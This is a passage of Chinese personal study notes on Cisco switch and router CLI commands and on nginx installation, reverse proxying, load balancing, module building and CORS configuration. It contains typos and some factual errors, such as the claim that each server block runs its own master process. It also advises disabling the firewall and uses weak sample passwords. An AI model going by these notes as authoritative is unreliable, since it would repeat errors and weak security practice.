    "body": "# 1. 模式转换命令\n1. 用户模式----特权模式,使用命令`enable`, 简写: `en`\n用户模式:查看初始化的信息. 终端显示为： `Switch>`\n特权模式:查看所有信息、调试、保存配置信息. 终端显示为:`Switch#`\n在该模式下可以使用show、clear、ping等命令\n\n2. 特权模式----全局配置模式,使用命令`config t`, 简写: `conf t`\n全局配置模式：配置所有信息、针对整个路由器或交换机的所有接口. 终端显示为:`Switch(config)#`\n\n3. 全局配置模式----接口模式,\n对单个接口进行操作：\n&nbsp;&nbsp;使用命令`interface+接口类型+接口号`, interface可以简写成`int` 终端显示为:`Switch(config-if)#`\n对多个接口进行操作：\n&nbsp;&nbsp;使用命令`interface range +接口类型+访问`， 例如：`Switch(config)#interface range fastethernet 0/4 - 6` 终端显示为：`Switch(config-if-range)#`\n接口模式：针对某一个接口的配置\n\n4. 全局配置模式----VLAN模式,使用命令`vlan+vlan的id` ， 如果该id没有，则会自动创建\nVLAN模式： 针对某一个VLAN ID进行配置。 终端显示： `Switch(config-vlan)#`\n\n5. 全局配置模式----线控模式,使用命令`line+接口类型+接口号`\n线控模式：对路由器进行控制的接口配置\n\n退回当前模式： 使用`exit`命令\n退回到特权模式： 使用`end`命令\n\n# 2. 基本配置命令\n## 2.1 三层交换机配置命令\n```\nSwitch#show mac-a    -->查看交换表\nSwitch#clear mac-a   -->清空交换表\nSwitch(config)#no spanning-tree vlan 1  -->关闭交换机中的生成树协议STP\n\n# 配置端口VLAN\nSwitch(config)#vlan 3           -->对vlan id为3的vlan进行操作， 由于没有id为3的vlan，所以会自动创建\nSwitch(config-vlan)#name Vlan3  -->将其命名为Vlan3\nSwitch#show vlan brief          -->查看vlan信息\n\nSwitch(config)#interface range fastethernet 0/4 - 6   --> 对接口为fastethernet类型的0/4都0/6的端口进行配置\nSwitch(config-if-range)#switchport mode access        --> 切换这个端口的模式为Access模式\nSwitch(config-if-range)#switchport access vlan 2      --> 将这些端口的Vlan ID设置为2\n```\n\n## 2.2 路由器配置命令\n```\nRouter#show arp  -->查看arp表\nRouter#clear arp  -->清空arp表\n\n路由信息协议 RIP\nRouter(config)# router rip\nRouter(config-router)# network <直接相连的要用 rip 协议的有类别网络号>\nRouter# show ip protocols\nRouter# show ip route\nRouter# debug ip rip\n\nRouter(config)#int g0/0/0\nRouter(config-if)#ip add 10.0.0.2 255.0.0.0\nRouter(config-if)#no shut\n\n内部路由选择协议\n*使用 router 和 network 命令\nRouter(config)# router <路由协议 rip | igrp | eigrp | ospf | is-is 等> [自主系统号]\nRouter(config-router)# network <直接相连的要用此路由协议的网络号>\nRouter(config-router)# network <直接相连的要用此路由协议的网络号>\n\n内部网关路由协议 IGRP\nRouter(config)# router igrp <自主系统号>\nRouter(config-router)# network <直接相连的要用 igrp 协议的有类别网络号>\nRouter# show ip interface\nRouter# show ip protocols\nRouter# show ip route\nRouter# debug ip rip\n\n外部网关路由协议BGP\nRouter(config)# router bgp <自主系统号>\nRouter(config-router)# neighbor <相邻的路由器的接口的ip地址> remote-as <邻居的自主系统号>\nRouter(config-router)# network <要通告的直连的网络地址> mask <该网络地址的掩码>\n\n```\n\n## 2.5 密码设置\n```\nservice password-encryptin 手工加密所有密码\nenable password +密码 配置明文密码\nena sec +密码 配置密文密码\nline vty 0 4/15 进入 telnet 接口\npassword +密码 配置 telnet 密码\nline aux 0 进入 AUX 接口\npassword +密码 配置密码\nline con 0 进入 CON 接口\npassword +密码 配置密码\nbandwidth+数字 配置带宽\n在 Cisco 设备上修改控制端口密码：\nR1(config)# line console 0\nR1(config-line)# login\nR1(config-line)# password Lisbon\nR1(config)# enable password Lilbao\nR1(config)# login local\nR1(config)# username student password cisco\n在 Cisco 设备上设置控制台及 vty 端口的会话超时：\nR1(config)# line console 0\nR1(config-line)# exec-timeout 5 10\nR1(config)# line vty 0 4\nR1(config-line)# exec-timeout 5 2\n```\n\n## 2.6 NVRAM\n```\nshow startup config 查看 NVRAM 中的配置信息\ncopy run-config atartup config 保存信息到 NVRAM\nwrite 保存信息到 NVRAM\nerase startup-config 清除 NVRAM 中的配置信息\ndescription+信息 配置接口听描素信息\n```\n\n## 2.7 提示语\nbanner motd # +信息 + # 配置路由器或交换机的描素信息\n\n\n## 2.8 vlan\n```\nvlan database 进入 VLAN 数据库模式\nvlan +vlan 号+ 名称 创建 VLAN\nswitchport access vlan +vlan 号 为 VLAN 为配接口\ninterface vlan +vlan 号 进入 VLAN 接口模式\nip add +ip 地址 为 VLAN 配置管理 IP 地址\n```\n\n## 2.9 VTP 中继\n```\nvtp+service/tracsparent/client 配置 SW 的 VTP 工作模式\nvtp +domain+域名 配置 SW 的 VTP 域名\nvtp +password +密码 配置 SW 的密码\nswitchport mode trunk 启用中继\nno vlan +vlan 号 删除 VLAN\n```\n\n## 2.11 CISCO 命令集——路由选择协议及排障\n*ip route 命令\nRouter(config)# ip route <目录网络或子网号> [子网掩码] <下一路由器 IP 地址 | 从本地出口\n的地址> [管理距离 0~255，默认为 1]\n（注：静态地址配置）\n*ip default-network 命令\nRouter(config)# ip default-network <目标网络号>\n(注：配合路由协使用，用其中的一个动态路由号作默认路由配置)\nRouter(config)# ip route 0.0.0.0 0.0.0.0 <下一路由器 IP 地址 | 从本地出口的地址>\n(注：只有一个公网地址时，在出口路由器上的配置)\n"
  },
  {
    "title": "./notes/软件/nginx.md",
    "body": "**Nginx（engine x）是一个高性能HTTP和反向代理web服务器**，同时也提供了IMAP/POP3/SMTP服务.Nginx是由伊戈尔素耶夫为俄罗斯访问量第二的Rambler.ru站点开发的，第一个公开版本0.1.0发布于2004年10月4日。2011年6月1日，nginx1.0.4发布。\n\n其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大结使用nginx网站用户有：百度、京东、新浪、网易、腾讯、宝等.在全球活跃的网站中有12.18%的使用比率，大约为2220万个网站。\n\nNginx是一个安装非常的简单、配置文件非常简洁（还能够支持perl语法）、Bug非常少的服务。Nginx启动特别容易，并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动.你还能够不问断服务的情况下进行软件版本的升级.\n\nNginx代码完全用C语言从头写成。官方数据测试表明能够支持高达50000个并发连接数的响应。\n\n# Nginx常用功能\n## Http代理，反向代理 \nHttp代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。\nNginx在做反向代理时，提供性能稳定，并且能够提供配置灵活的转发功能。Nginx可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走web服务器，只要你正则写的没问题，又有相对应的服务器解决方案，你就可以随心所欲的玩。并且Nginx对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以**将请求重新转发**给另外一台服务器，然后自动去除异常服务器。\n## 负载均衡\nNginx提供的负载均衡策略有2种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。\n\n**轮询**\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511143125.png\" width=\"700px\"/>\n\n**加权轮询**\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511143151.png\" width=\"700px\"/>\n\n**ip hash**\niphash对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511143232.png\" width=\"700px\"/>\n\n\n## 动静分离\n动静分离，在我们的软件开发中，有些请求是需要后台处理的，有些请求是不需要经过后台处理的（如：css、html、jpg、js等文件），这些不需要经过后台处理的文件称为静态文件。让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，提高资源响应的速度。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511143513.png\" width=\"700px\"/>\n\n\n# LINUX安装nginx\n1. 安装Nginx\n```shell\napt-get install nginx\n```\n2. 配置nginx.conf\n```shell\n# 打开配置文件\nvi /usr/local/nginx/conf/nginx.conf\n```\n将端口号改成8089，因为可能apeache占用80端口，apeache端口尽量不要修改，我们选择修改nginx端口。\n\nlocalhost修改为你服务器ip地址。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511143908.png\" width=\"500px\"/>\n\n3. 启动nginx\n```shell\n/usr/local/nginx/sbin/nginx -s reload\n```\n如果出现报错：nginx: [error] open() ＂/usr/local/nginx/logs/nginx.pid＂ failed\n\n则运行： /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf\n\n再次启动即可！\n查看nginx进程是否启动：`ps -ef | grep nginx`\n\n4. 若想使用外部主机连接上虚拟机访问端口192.168.131.2，需要关闭虚拟机的防火墙：\ncentOS6及以前版本使用命令： systemctl stop iptables.service\ncentOS7关闭防火墙命令： systemctl stop firewalld.service\n随后访问该ip即可看到nginx界面。\n\n5. 访问服务器ip查看（备注，由于我监听的仍是80端口，所以ip后面的端口号被省略）\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511144016.png\" width=\"700px\"/>\n\n# nginx常用命令\n**linux下nginx常用命令**\n`nginx`: 启动\n`nginx -s stop`: 停止\n`nginx -s quit`: 安全退出\n`nginx -s reload`: 重启\n\n**window下命令启动/停止nginx**\n查看Nginx的版本号：nginx -v\n启动Nginx：start nginx， 注意：不要直接运行`nginx.exe`命令来启动nginx,否则会导致不能在cmd界面关闭nginx\n快速停止或关闭Nginx：nginx -s stop\n正常停止或关闭Nginx：nginx -s quit\n配置文件修改重装载命令：nginx -s reload\n\n# Nginx基本配置\nnginx配置文件的结构如下：\n```conf\n...              #全局块\n\nevents {         #events块\n   ...\n}\n\nhttp      #http块\n{\n    ...   #http全局块\n    server        #server块\n    { \n        ...       #server全局块\n        location [PATTERN]   #location块\n        {\n            ...\n        }\n        location [PATTERN] \n        {\n            ...\n        }\n    }\n    server\n    {\n      ...\n    }\n    ...     #http全局块\n}\n```\n- 全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。\n- events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。\n- http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。\n- server块：配置虚拟主机的相关参数，一个http中可以有多个server。\n- location块：配置请求的路由，以及各种页面的处理情况。\n\n下面给大家上一个配置文件，作为理解。\n```conf\n########### 每个指令必须有分号结束。#################\n#user administrator administrators;  #配置用户或者组，默认为nobody nobody。\n#worker_processes 2;  #允许生成的进程数，默认为1\n#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址\nerror_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg\nevents {\n    accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on\n    multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off\n    #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #最大连接数，默认为512\n}\nhttp {\n    include       mime.types;   #文件扩展名与文件类型映射表\n    default_type  application/octet-stream; #默认文件类型，默认为text/plain\n    #access_log off; #取消服务日志    \n    log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式\n    access_log log/access.log myFormat;  #combined为日志格式的默认值\n    sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。\n    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。\n    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #热备\n    }\n\n    //必须使⽤虚拟机配置站点,\t每个虚拟机使⽤⼀个server{}段\n    server {\n        keepalive_requests 120; #单连接请求上限次数。\n        listen       4545;   #监听端口\n        server_name  127.0.0.1;   #提供服务的域名或主机名\n\n        location  ~*^.+$ {       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。\n           #root path;  #根目录\n           #index vv.txt;  #设置默认页\n           proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表\n           deny 127.0.0.1;  #拒绝的ip\n           allow 172.18.5.54; #允许的ip           \n        } \n        error_page 404 https://www.baidu.com; #错误页\n    }\n\n    //第⼆个虚拟主机配置\n    server\t{\n      ...\n    }\n}\n```\n上面是nginx的基本配置，需要注意的有以下几点：\n1. 几个常见配置项：\n- $remote_addr 与 $http_x_forwarded_for 用以记录客户端的ip地址；\n- $remote_user ：用来记录客户端用户名称；\n- $time_local ： 用来记录访问时间与时区；\n- $request ： 用来记录请求的url与http协议；\n- $status ： 用来记录请求状态；成功是200；\n- $body_bytes_s ent ：记录发送给客户端文件主体内容大小；\n- $http_referer ：用来记录从那个页面链接访问过来的；\n- $http_user_agent ：记录客户端浏览器的相关信息；\n2. 惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。\n3. 每个指令必须有分号结束。\n\n\n# Nginx 反向代理与负载均衡详解\n## Nginx 代理服务的配置说明\n1. 设置 404 页面导向地址\n```conf\nerror_page 404 https://www.runnob.com; #错误页\nproxy_intercept_errors on;    #如果被代理服务器返回的状态码为400或者大于400，设置的error_page配置起作用。默认为off。\n```\n2. 如果我们的代理只允许接受get，post请求方法的一种\n```conf\nproxy_method get;    #支持客户端的请求方法。post/get；\n```\n3. 设置支持的http协议版本\n```conf\nproxy_http_version 1.0 ; #Nginx服务器提供代理服务的http协议版本1.0，1.1，默认设置为1.0版本\n```\n4. 如果你的nginx服务器给2台web服务器做代理，负载均衡算法采用轮询，那么当你的一台机器web程序iis关闭，也就是说web不能访问，那么nginx服务器分发请求还是会给这台不能访问的web服务器，如果这里的响应连接时间过长，就会导致客户端的页面一直在等待响应，对用户来说体验就打打折扣，这里我们怎么避免这样的情况发生呢。这里我配张图来说明下问题。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511151035.png\" width=\"700px\"/>\n\n如果负载均衡中其中web2发生这样的情况，nginx首先会去web1请求，但是nginx在配置不当的情况下会继续分发请求道web2，然后等待web2响应，直到我们的响应时间超时，才会把请求重新分发给web1，这里的响应时间如果过长，用户等待的时间就会越长。\n下面的配置是解决方案之一。\n```conf\nproxy_connect_timeout 1;   #nginx服务器与被代理的服务器建立连接的超时时间，默认60秒\nproxy_read_timeout 1; #nginx服务器向被代理服务器组发出read请求后，等待响应的超时间，默认为60秒。\nproxy_send_timeout 1; #nginx服务器向被代理服务器组发出write请求后，等待响应的超时间，默认为60秒。\nproxy_ignore_client_abort on;  #客户端断网时，nginx服务器是否中断对被代理服务器的请求。默认为off。\n```\n5. 如果使用upstream指令配置了一组服务器作为被代理服务器，服务器中的访问算法遵循配置的负载均衡规则，同时可以使用该指令配置在发生哪些异常情况时，将请求顺次交由下一组服务器处理。\n```conf\nproxy_next_upstream timeout;  #反向代理upstream中设置的服务器组出现故障时，被代理服务器返回的状态值。\n```\n状态值可以是：error|timeout|invalid_header|http_500|http_502|http_503|http_504|http_404|off\n- error：建立连接或向被代理的服务器发送请求或读取响应信息时服务器发生错误。\n- timeout：建立连接，想被代理服务器发送请求或读取响应信息时服务器发生超时。\n- invalid_header:被代理服务器返回的响应头异常。\n- off:无法将请求分发给被代理的服务器。\n- http_400，....:被代理服务器返回的状态码为400，500，502，等。\n\n6. 如果你想通过http获取客户的真实ip而不是获取代理服务器的ip地址，那么要做如下的设置。\n```conf\nproxy_set_header Host $host; #只要用户在浏览器中访问的域名绑定了 VIP VIP 下面有RS；则就用$host ；host是访问URL中的域名和端口  www.taobao.com:80\nproxy_set_header X-Real-IP $remote_addr;  #把源IP 【$remote_addr,建立HTTP连接header里面的信息】赋值给X-Real-IP;这样在代码中 $X-Real-IP来获取 源IP\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#在nginx 作为代理服务器时，设置的IP列表，会把经过的机器ip，代理机器ip都记录下来，用 【，】隔开；代码中用 echo $x-forwarded-for |awk -F, '{print $1}' 来作为源IP\n```\n7. 下面是我的一个关于代理配置的配置文件部分，仅供参考。\n```conf\ninclude       mime.types;   #文件扩展名与文件类型映射表\ndefault_type  application/octet-stream; #默认文件类型，默认为text/plain\n#access_log off; #取消服务日志    \nlog_format myFormat ' $remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式\naccess_log log/access.log myFormat;  #combined为日志格式的默认值\nsendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。\nsendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。\nkeepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。\nproxy_connect_timeout 1;   #nginx服务器与被代理的服务器建立连接的超时时间，默认60秒\nproxy_read_timeout 1; #nginx服务器想被代理服务器组发出read请求后，等待响应的超时间，默认为60秒。\nproxy_send_timeout 1; #nginx服务器想被代理服务器组发出write请求后，等待响应的超时间，默认为60秒。\nproxy_http_version 1.0 ; #Nginx服务器提供代理服务的http协议版本1.0，1.1，默认设置为1.0版本。\n#proxy_method get;    #支持客户端的请求方法。post/get；\nproxy_ignore_client_abort on;  #客户端断网时，nginx服务器是否终端对被代理服务器的请求。默认为off。\nproxy_ignore_headers \"Expires\" \"Set-Cookie\";  #Nginx服务器不处理设置的http相应投中的头域，这里空格隔开可以设置多个。\nproxy_intercept_errors on;    #如果被代理服务器返回的状态码为400或者大于400，设置的error_page配置起作用。默认为off。\nproxy_headers_hash_max_size 1024; #存放http报文头的哈希表容量上限，默认为512个字符。\nproxy_headers_hash_bucket_size 128; #nginx服务器申请存放http报文头的哈希表容量大小。默认为64个字符。\nproxy_next_upstream timeout;  #反向代理upstream中设置的服务器组，出现故障时，被代理服务器返回的状态值。error|timeout|invalid_header|http_500|http_502|http_503|http_504|http_404|off\n#proxy_ssl_session_reuse on; 默认为on，如果我们在错误日志中发现“SSL3_GET_FINSHED:digest check failed”的情况时，可以将该指令设置为off。\n```\n## Nginx 负载均衡详解\n首先给大家说下upstream这个配置，这个配置是写一组被代理的服务器地址，然后配置负载均衡的算法。这里的被代理服务器地址有2种写法。\n```conf\nupstream mysvr { \n    server 192.168.10.121:3333;\n    server 192.168.10.122:3333;\n}\nserver {\n    ....\n    location  ~*^.+$ {         \n        proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表         \n    }\n}\n```\n然后，就来点实战的东西。\n\n1. **热备**：如果你有2台服务器，当一台服务器发生事故时，才启用第二台服务器给提供服务。服务器处理请求的顺序：AAAAAA突然A挂啦，BBBBBBBBBBBBBB.....\n```conf\nupstream mysvr { \n    server 127.0.0.1:7878; \n    server 192.168.10.121:3333 backup;  #热备     \n}\n```\n2. **轮询**：nginx默认就是轮询其权重都默认为1，服务器处理请求的顺序：ABABABABAB....\n```conf\nupstream mysvr { \n    server 127.0.0.1:7878;\n    server 192.168.10.121:3333;       \n}\n```\n3. **加权轮询**：跟据配置的权重的大小而分发给不同服务器不同数量的请求。如果不设置，则默认为1。下面服务器的请求顺序为：ABBABBABBABBABB....\n```conf\nupstream mysvr { \n    server 127.0.0.1:7878 weight=1;\n    server 192.168.10.121:3333 weight=2;\n}\n```\n4. **ip_hash**：nginx会让相同的客户端ip请求相同的服务器。\n```conf\nupstream mysvr { \n    server 127.0.0.1:7878; \n    server 192.168.10.121:3333;\n    ip_hash;\n}\n```\n5. 关于nginx负载均衡配置的几个状态参数讲解。\n- down: 表示当前的server暂时不参与负载均衡。\n- backup: 预留的备份机器。当其他所有的非backup机器出现故障或者忙的时候，才会请求backup机器，因此这台机器的压力最轻。\n- max_fails:允许请求失败的次数，默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误。\n- fail_timeout: 在经历了max_fails次失败后，暂停服务的时间。max_fails可以和fail_timeout一起使用。\n```conf\nupstream mysvr { \n    server 127.0.0.1:7878 weight=2 max_fails=2 fail_timeout=2;\n    server 192.168.10.121:3333 weight=1 max_fails=2 fail_timeout=1;    \n}\n```\n到这里应该可以说nginx的内置负载均衡算法已经没有货啦。如果你像跟多更深入的了解nginx的负载均衡算法，nginx官方提供一些插件大家可以了解下。\n\n# nginx添加模块\n可以通过`nginx -V`命令来查看安装了那些模块\n\n## 给已编译安装完成后的nginx添加模块\n本人nginx第一次编译安装时只安装了两个模块，但是在后面学习的时候发现不够用了，去查了一下如何在已经编译安装的基础上添加新的模块，总结如下：\n\n5个步骤实现\n1. 进入nginx编译安装的目录\n这里的目录是指解压后的源码包里，例如：nginx-1.19.0\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511174909.png\" width=\"700px\"/>\n\n2. 执行编译\n执行编译前的配置（configure的配置），添加需要的模块，我这里执行的是下面这条语句，按需添加即可，不一定按照我的写\n```shell\n./configure --prefix=/usr/local/nginx --add-module=第三方模块的目录 \n```\n可以使用 ./configure --help 命令查询有哪些模块\n\n3. 执行make命令\n执行make命令编译，不要执行make install，否则会把之前的nginx全部覆盖\n\n4. 停止服务并替换命令\n先停止正在运行的nginx的服务（若不在运行则无视）: `nginx -s stop`\n将make之后产生的nginx命令复制到nginx目录\nmake之后产生的nginx的位置是：objs（如果这个文件夹里没有，那就再sbin里面）\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511175038.png\" width=\"700px\"/>\n\n5. 验证是否完成，如果生效会列出新增的模块\n```shell\nnginx -V\n```\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511175134.png\" width=\"700px\"/>\n\n## 给通过apt-get安装的nginx添加模块\n首先，要知道你原安装的nginx版本，以及原来安装的模块\n```shell\n/usr/sbin/nginx -V\n```\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511180241.png\" width=\"700px\"/>\n\n然后去官网下载一个相同版本的源码包,解压\n```shell\ncd /opt\ntar -xvf nginx-1.14.0.tar.gz\n```\n\n进入解压后的源码包,编译\n```shell\ncd nginx-1.14.0\n# 加上你已有的模块，和想要添加的模块\nsudo ./configure \\\n--with-cc-opt='-g -O2 -fdebug-prefix-map=/build/nginx-GkiujU/nginx-1.14.0=. -fstack-\nprotector-strong -Wformat -Werror=format-security -fPIC -Wdate-time -\nD_FORTIFY_SOURCE=2' --with-ld-opt='-Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now -\nfPIC' --prefix=/usr/share/nginx --conf-path=/etc/nginx/nginx.conf --http-log-\npath=/var/log/nginx/access.log --error-log-path=/var/log/nginx/error.log --lock-\npath=/var/lock/nginx.lock --pid-path=/run/nginx.pid --modules-\npath=/usr/lib/nginx/modules --http-client-body-temp-path=/var/lib/nginx/body --http-\nfastcgi-temp-path=/var/lib/nginx/fastcgi --http-proxy-temp-path=/var/lib/nginx/proxy --\nhttp-scgi-temp-path=/var/lib/nginx/scgi --http-uwsgi-temp-path=/var/lib/nginx/uwsgi --\nwith-debug --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --\nwith-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-\nhttp_dav_module --with-http_slice_module --with-threads --with-http_addition_module --\nwith-http_geoip_module=dynamic --with-http_gunzip_module --with-http_gzip_static_module \n--with-http_image_filter_module=dynamic --with-http_sub_module --with-\nhttp_xslt_module=dynamic --with-stream=dynamic --with-stream_ssl_module --with-\nmail=dynamic --with-mail_ssl_module \\  #之前已有\n--add-module=/opt/fastdfs-nginx-module-master/src #后来添加，记住是src目录\n```\n\n编译完成后执行(不要 make install,不要 make install,不要 make install)\n```shell\nsudo make\n```\n\n替换nginx二进制文件(备份备份备份):\n```shell\ncp /usr/sbin/nginx /usr/sbin/nginx.bak #备份\ncp ./objs/nginx /usr/local/nginx/sbin/ #make编译过后的nginx，替换系统安装\n```\n\n添加成功\n\n# nginx解决跨域\n由于跨域问题**只**发生在浏览器上， 所以nginx服务器访问其他服务器资源是不存在跨域问题的。\n所以当我们不能修改要访问的服务器后端代码，即不能在要访问的服务器上使用CORS来解决跨域问题时， 我们可以让nginx服务器访问这个服务器，此时浏览器就只需要访问nginx服务器即可，但是，虽然nginx服务器与其他服务器资源不存在跨域问题，但是浏览器与nginx服务器之间还是存在跨域问题，如下：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210512224737.png\" width=\"700px\"/>\n\n不过，我们可以修改nginx服务器的配置（使用CORS），来解决跨域问题，这就是为什么要引入nginx的原因， 有关在nginx上使用CORS的配置如下：\n\n```conf\nserver {\n\t\tlisten       8082;\n\t\tserver_name  localhost;\n\n\t\t#charset koi8-r;\n\n\t\t#access_log  logs/host.access.log  main;\n\n\t\tlocation / {\n\t\t\tproxy_pass http://localhost:8081;\n\t\t\tif ($request_method = 'GET') {\n\t\t\t\tadd_header Access-Control-Allow-Origin http://localhost:3000;\n\t\t\t\tadd_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS,PUT';\n\t\t\t\tadd_header Access-Control-Allow-Credentials true;\n\t\t\t\tadd_header 'Access-Control-Allow-Headers' 'Cookie,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';\n\t\t\t}\n\t\t\tif ($request_method = 'POST') {\n\t\t\t\tadd_header Access-Control-Allow-Origin http://localhost:3000;\n\t\t\t\tadd_header Access-Control-Allow-Methods GET,POST,OPTIONS,DELETE,PUT;\n\t\t\t\tadd_header Access-Control-Allow-Credentials true;\n\t\t\t\tadd_header 'Access-Control-Allow-Headers' 'Cookie,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';\n\t\t\t}\n\t\t\tif ($request_method = 'DELETE') {\n\t\t\t\tadd_header Access-Control-Allow-Origin http://localhost:3000;\n\t\t\t\tadd_header Access-Control-Allow-Methods GET,POST,OPTIONS,DELETE,PUT;\n\t\t\t\tadd_header Access-Control-Allow-Credentials true;\n\t\t\t\tadd_header 'Access-Control-Allow-Headers' 'Cookie,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';\n\t\t\t}\n\t\t\tif ($request_method = 'PUT') {\n\t\t\t\tadd_header Access-Control-Allow-Origin http://localhost:3000;\n\t\t\t\tadd_header Access-Control-Allow-Methods GET,POST,OPTIONS,DELETE,PUT;\n\t\t\t\tadd_header Access-Control-Allow-Credentials true;\n\t\t\t\tadd_header 'Access-Control-Allow-Headers' 'Cookie,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';\n\t\t\t}\n\t\t\tif ($request_method = 'OPTIONS') {\n\t\t\t\tadd_header 'Access-Control-Allow-Origin' http://localhost:3000;\n\t\t\t\tadd_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, DELETE,PUT';\n\t\t\t\tadd_header Access-Control-Allow-Credentials true;\n\t\t\t\t#\n\t\t\t\t# Custom headers and headers various browsers *should* be OK with but aren't\n\t\t\t\t#\n\t\t\t\tadd_header 'Access-Control-Allow-Headers' 'Cookie,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';\n\t\t\t\t#\n\t\t\t\t# Tell client that this pre-flight info is valid for 20 days\n\t\t\t\t#\n\t\t\t\tadd_header 'Access-Control-Max-Age' 2;\n\t\t\t\tadd_header 'Content-Type' 'text/plain charset=UTF-8';\n\t\t\t\tadd_header 'Content-Length' 0;\n\t\t\t\treturn 204;\n\t\t\t}\n\t\t}\n}\n\n```\n\n注：当nginx服务器向其他资源服务器发送请求时，如果该请求对应的响应状态码为4xx,或5xx时, 则浏览器仍会报如下错误：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210513184615.png\" width=\"700px\"/>\n\n此时通过nginx的access.log查看可知，nginx发送请求的对应的响应状态码为500，表明资源服务器出现问题\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210513184732.png\" width=\"700px\"/>\n\n\n# nginx原理\n<font color=\"red\">Nginx 在启动后，每一个server会对应一个master进程， master进程所占用的端口号为它所要监听的端口号</font>； 证明如下：\n\nnginx配置文件\n```\nevents{\n\n}\n\nhttp {\n  server {\n    listen 8030;\n  }\n  server {\n    listen 8031;\n  }\n  server {\n    listen 8032;\n  }\n}\n```\n启动nginx后，使用`netstat -lntup`查看端口占用情况，如下：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210512174904.png\" width=\"700px\"/>\n\n## server_name的作用\nserver_name 为虚拟服务器的识别路径。因此不同的域名会通过请求头中的HOST字段，匹配到特定的server块，转发到对应的应用服务器中去。\n<font color=\"red\">注：nginx只能监听本机的端口，不能监听其他机器的，所以server_name设置成其他机器的ip是没有作用，还是使用的本机ip</font>\n\n**案例**\n修改nginx.conf\n```conf\nserver {\n\tlisten 80;\n\tserver_name www;\n\tlocation / {\n\t\tdefault_type text/html;\n\t\tcontent_by_lua '\n\t\t\tngx.say(\"<p>first</p>\")\n\t\t';\n\t}\n}\n \nserver {\n\tlisten  80;\n\tserver_name www.zkh.com;\n\tlocation / {\n\t\tdefault_type text/html;\n\t\tcontent_by_lua '\n\t\t\tngx.say(\"<p>second</p>\")\n\t\t';        \n\t}\n}\n \nserver {\n\tlisten 80;\n\tserver_name www.zkh.*;\n\tlocation / {\n\t\tdefault_type 